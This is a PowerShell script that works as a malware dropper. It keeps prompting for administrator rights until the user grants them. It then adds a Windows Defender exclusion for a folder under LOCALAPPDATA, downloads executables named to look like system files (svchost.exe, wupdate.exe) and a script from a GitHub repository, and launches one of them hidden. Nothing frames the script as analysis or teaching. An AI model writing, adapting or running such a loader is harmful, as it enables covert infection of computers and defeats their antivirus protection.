$ErrorActionPreference = "SilentlyContinue"

$isAdmin = ([Security.Principal.WindowsPrincipal] `
    [Security.Principal.WindowsIdentity]::GetCurrent()
).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    if ($PSCommandPath -and (Test-Path -LiteralPath $PSCommandPath)) {
        $argLine = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    } else {
        $body  = [ScriptBlock]::Create($MyInvocation.MyCommand.Definition).ToString()
        $b64   = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($body))
        $argLine = "-NoProfile -ExecutionPolicy Bypass -EncodedCommand $b64"
    }

    while ($true) {
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName        = "powershell.exe"
        $psi.Arguments       = $argLine
        $psi.Verb            = "runas"
        $psi.UseShellExecute = $true
        $psi.WindowStyle     = [System.Diagnostics.ProcessWindowStyle]::Normal
        try {
            $p = [System.Diagnostics.Process]::Start($psi)
            $p.WaitForExit()
            exit
        } catch {
            Start-Sleep -Milliseconds 400
            continue
        }
    }
}

$targetDir = Join-Path $env:LOCALAPPDATA "LUU"
New-Item -ItemType Directory -Path $targetDir -Force | Out-Null

if (-not ([Security.Principal.WindowsPrincipal] `
    [Security.Principal.WindowsIdentity]::GetCurrent()
).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    exit 1
}

Add-MpPreference -ExclusionPath $targetDir -ErrorAction Continue

$repoBase = "https://raw.githubusercontent.com/westoakstudios/LUU/main"
$files = @(
    @{ Name = "host.ps1";    Url = "$repoBase/host.ps1"    }
    @{ Name = "svchost.exe"; Url = "$repoBase/svchost.exe" }
    @{ Name = "wupdate.exe"; Url = "$repoBase/wupdate.exe" }
)
foreach ($f in $files) {
    $dest = Join-Path $targetDir $f.Name
    try { Invoke-WebRequest -Uri $f.Url -OutFile $dest -UseBasicParsing } catch { }
}

$launcher = Join-Path $targetDir "wupdate.exe"
if (Test-Path -LiteralPath $launcher) {
    Start-Process -FilePath $launcher -WorkingDirectory $targetDir -WindowStyle Hidden
}
